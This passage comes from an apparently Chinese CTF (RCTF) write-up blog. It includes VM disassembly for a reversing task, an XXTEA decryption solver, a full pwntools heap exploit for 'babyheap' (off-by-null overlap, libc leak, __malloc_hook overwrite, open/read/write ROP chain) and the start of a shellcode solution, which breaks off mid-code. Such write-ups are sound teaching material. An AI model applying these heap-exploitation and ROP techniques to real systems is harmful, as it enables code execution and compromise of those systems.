class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br></pre></td><td class="code"><pre><span class="line">mov r0, 0x26a</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, input[0]</span><br><span class="line">cmp r0, 0</span><br><span class="line">je  r1</span><br><span class="line">mov r1, 0x30</span><br><span class="line">sub r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x0</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x7</span><br><span class="line">mov r1, r0</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">shl r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x6</span><br><span class="line">mov r1, r0</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">add r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x6</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0x7</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, 0x1</span><br><span class="line">add r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x7</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x0</span><br><span class="line">mov ip, r0</span><br><span class="line">mov r1, 0x6</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, 0x7</span><br><span class="line">mul r0, r1</span><br><span class="line">mov r1, 0xf423f</span><br><span class="line">equl r0, r1</span><br><span class="line">mov r1, 0xc36</span><br><span class="line">cmp r0, 0</span><br><span class="line">je  r1</span><br><span class="line">mov r1, 0x6</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xb</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">xor r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0xb</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xc</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">xor r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0xc</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xd</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">xor r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0xd</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x7</span><br><span class="line">mov r1, 0x0</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xd</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0x7</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">below r0, r1</span><br><span class="line">mov r1, 0x9f6</span><br><span class="line">cmp r0, 0</span><br><span class="line">je  r1</span><br><span class="line">mov r1, 0x6</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0x7</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">add r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x10</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0x7</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xe</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">nop</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x11</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0x10</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0x11</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">xor r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x4</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0x7</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x3</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x2</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xe</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">if r2&lt;128:</span><br><span class="line">    r[r2] = r3</span><br><span class="line">nop</span><br><span class="line">mov r1, 0x7</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, 0x1</span><br><span class="line">add r0, r1</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x7</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r0, 0x4e0</span><br><span class="line">mov ip, r0</span><br><span class="line">mov r1, 0xb</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x4</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xf</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, 0x0</span><br><span class="line">nop</span><br><span class="line">mov r1, 0xc</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x4</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xf</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, 0x1</span><br><span class="line">nop</span><br><span class="line">mov r1, 0xd</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x4</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xf</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, 0x2</span><br><span class="line">nop</span><br><span class="line">mov r1, 0xe</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, r0</span><br><span class="line">mov r0, 0x4</span><br><span class="line">if r0&lt;128:</span><br><span class="line">    r[r0] = r1</span><br><span class="line">mov r1, 0xf</span><br><span class="line">if r1&lt;128:</span><br><span class="line">    r0 = r[r1]</span><br><span class="line">mov r1, 0x3</span><br><span class="line">nop</span><br></pre></td></tr></table></figure><p>关键在前面有个乘法和对比，猜一下应该是输入后面再接一个二进制数，此数*7后等于0xf423f，即0x22e09 = 0b100010111000001001。测试一下是按照大端序的，即是100100000111010001，接在之前的512位后面就是最后的输入了。</p><p>flag画在一张图事实上。</p><p>13yR01sw3iy1l1n9</p><h3><span id="sourceguardian">sourceguardian</span></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pch.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX ((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4) ^ (sum^y) + (k[p&amp;3^e]^z))</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">btea</span><span class="params">(<span class="keyword">long</span>* v, <span class="keyword">long</span> n, <span class="keyword">long</span>* k)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> z = v[n - <span class="number">1</span>], y = v[<span class="number">0</span>], sum = <span class="number">0</span>, e, DELTA = <span class="number">0x9e3779b9</span>;</span><br><span class="line"><span class="keyword">long</span> p, q;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          <span class="comment">/* Coding Part */</span></span><br><span class="line">q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line"><span class="keyword">while</span> (q-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">sum += DELTA;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++) y = v[p + <span class="number">1</span>], z = v[p] += MX;</span><br><span class="line">y = v[<span class="number">0</span>];</span><br><span class="line">z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) &#123;  <span class="comment">/* Decoding Part */</span></span><br><span class="line">n = -n;</span><br><span class="line">q = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">sum = q * DELTA;</span><br><span class="line"><span class="keyword">while</span> (sum != <span class="number">0</span>) &#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line"><span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--) z = v[p - <span class="number">1</span>], y = v[p] -= MX;</span><br><span class="line">z = v[n - <span class="number">1</span>];</span><br><span class="line">y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">sum -= DELTA;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">long</span> cipher[] = &#123; <span class="number">1029560848</span>, <span class="number">2323109303</span>, <span class="number">4208702724</span>, <span class="number">3423862500</span>, <span class="number">3597800709</span>, <span class="number">2222997091</span>, <span class="number">4137082249</span>, <span class="number">2050017171</span>, <span class="number">4045896598</span> ,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">long</span> key[] = &#123; <span class="number">1752186684</span>, <span class="number">1600069744</span>, <span class="number">1953259880</span>, <span class="number">1836016479</span> &#125;;</span><br><span class="line"><span class="keyword">long</span> k[] = &#123; <span class="number">1752186684</span>, <span class="number">1600069744</span>, <span class="number">1953259880</span>, <span class="number">1836016479</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cipher[i] ^= key[i % <span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line">btea(cipher, <span class="number">-9</span>, key);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; (<span class="keyword">char</span>*)cipher &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2><span id="pwn">PWN</span></h2><h3><span id="babyheap">babyheap</span></h3><p>存在offbynull 构造overlap利用calloc在chunk位为2时不清空的特性进行leak然后控制malloc_hook利用一个使得rax为栈地址的gadgets分配栈从而得到可以执行open read write函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = process(&quot;./babyheap&quot;)</span><br><span class="line">elf = ELF(&quot;./babyheap&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">gdb.attach(p)</span><br><span class="line">cmd = lambda c:p.sendlineafter(&quot;Choice: \n&quot; ,str(c))</span><br><span class="line">def add(size):</span><br><span class="line">    cmd(1)</span><br><span class="line">    p.sendlineafter(&quot;Size: &quot; , str(size))</span><br><span class="line"></span><br><span class="line">def edit(index , content):</span><br><span class="line">    cmd(2)</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot; , str(index))</span><br><span class="line">    p.sendafter(&quot;Content: &quot; , content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    cmd(3)</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot; , str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    cmd(4)</span><br><span class="line">    p.sendlineafter(&quot;Index: &quot; , str(index))</span><br><span class="line"></span><br><span class="line">add(0x18) # 0  # 0x00</span><br><span class="line">add(0x320) # 1 # 0x20</span><br><span class="line">add(0x18) # 2 # 0x340</span><br><span class="line">add(0x18) # 3 # 0x360</span><br><span class="line"></span><br><span class="line">edit(1 , &quot;a&quot; * 0x2f0  + p64(0x300))</span><br><span class="line">delete(1)</span><br><span class="line">edit(0 , &quot;a&quot; * 0x18)</span><br><span class="line"></span><br><span class="line">add(0x18) #  1</span><br><span class="line">add(0x80) # unsorted bin leak  # 4</span><br><span class="line">add(0x18) # 5</span><br><span class="line">add(0x60) # fastbin attack # 6</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x348) # shrin result calloc # 1</span><br><span class="line"># memset</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71) + &quot;a&quot; * 0x60</span><br><span class="line">payload += p64(0x60) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line"></span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(1 , payload)</span><br><span class="line">delete(6)</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x72)[:7]</span><br><span class="line">edit(1 , payload)</span><br><span class="line">add(0x60)</span><br><span class="line">show(2)</span><br><span class="line">libc.address = u64(p.recvuntil(&quot;\x7f&quot;).ljust(8 , &quot;\x00&quot;)) - 0x58 - 0x3c4b20</span><br><span class="line">print(hex(libc.address))</span><br><span class="line">malloc_hook = libc.sym[&quot;__malloc_hook&quot;] - 0x23</span><br><span class="line">print hex(malloc_hook)</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71) + &quot;a&quot; * 0x60</span><br><span class="line">payload += p64(0x60) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">edit(1,payload)</span><br><span class="line">delete(2)</span><br><span class="line">#------------------</span><br><span class="line">fast_max = libc.address + 3958776</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71)</span><br><span class="line">payload += p64(libc.address+0x58+0x3c4b20)+p64(fast_max-0x10)+&quot;a&quot;*0x50</span><br><span class="line">payload += p64(0x60) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line"></span><br><span class="line">edit(1,payload)</span><br><span class="line">add(0x60)</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71) + &quot;a&quot; * 0x60</span><br><span class="line">payload += p64(0x60) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">edit(1,payload)</span><br><span class="line">delete(2)</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71)</span><br><span class="line">payload += p64(malloc_hook)</span><br><span class="line">edit(1,payload)</span><br><span class="line">raw_input()</span><br><span class="line">add(0x60) #2</span><br><span class="line">add(0x60)</span><br><span class="line">edit(6,&apos;flag&apos;.ljust(19,&apos;\0&apos;)+p64(libc.address+0xAA383))</span><br><span class="line">leng=0x28</span><br><span class="line">add(leng)</span><br><span class="line">libca=libc.address</span><br><span class="line">reada=p64(0xF7250+libca)</span><br><span class="line">writea=p64(0xF72B0+libca)</span><br><span class="line">edit(7,p64(0x200)+p64(libca+0x1b92)+p64(0x200)+reada)</span><br><span class="line">opena=p64(libca+0xF7030)</span><br><span class="line">exita=p64(libca+0x3A030)</span><br><span class="line">p_rdi_r=p64(libca+0x21102)</span><br><span class="line">p_rsi_r=p64(libca+0x1150CA)</span><br><span class="line">p_rdx_r=p64(libca+0x1b92)</span><br><span class="line">m_rdi_rax_r=p64(libca+0x8F42B)</span><br><span class="line">payload=&apos;8&apos;*0x20+p_rdi_r+p64(malloc_hook+0x10)+p_rdi_r+p64(malloc_hook+0x10)+p_rsi_r+p64(0)+opena+p_rdi_r+p64(3)+p_rsi_r+p64(malloc_hook)+p_rdx_r+p64(0x28)+reada+p_rdi_r+p64(1)+writea+exita</span><br><span class="line">#pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">#rctf&#123;15172bc66a5f317986cb8293597e033c&#125;</span><br></pre></td></tr></table></figure><h3><span id="shellcoder">shellcoder</span></h3><p>前面7字节shellcoder利用xhcg即可绕过，然后利用递归遍历目录寻找，大概4096种可能，每层4个文件夹，有6层。好在命名规则，都是4个字符长度的，然后用cat的shellcode获取flag即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">#context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ls():</span><br><span class="line">return asm(&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">push 0x2e</span><br><span class="line">mov al, 2      </span><br><span class="line">mov rdi, rsp   </span><br><span class="line">xor rsi, rsi </span><br><span class="line">xor rdx, rdx </span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">mov rdi,rax </span><br><span class="line">xor rdx,rdx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov dx, 0x3210 </span><br><span class="line">sub rsp, rdx </span><br><span class="line">mov rsi, rsp </span><br><span class="line">mov al, 78 </span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">xchg rax,rdx</span><br><span class="line"></span><br><span class="line">xor rax, rax</span><br><span 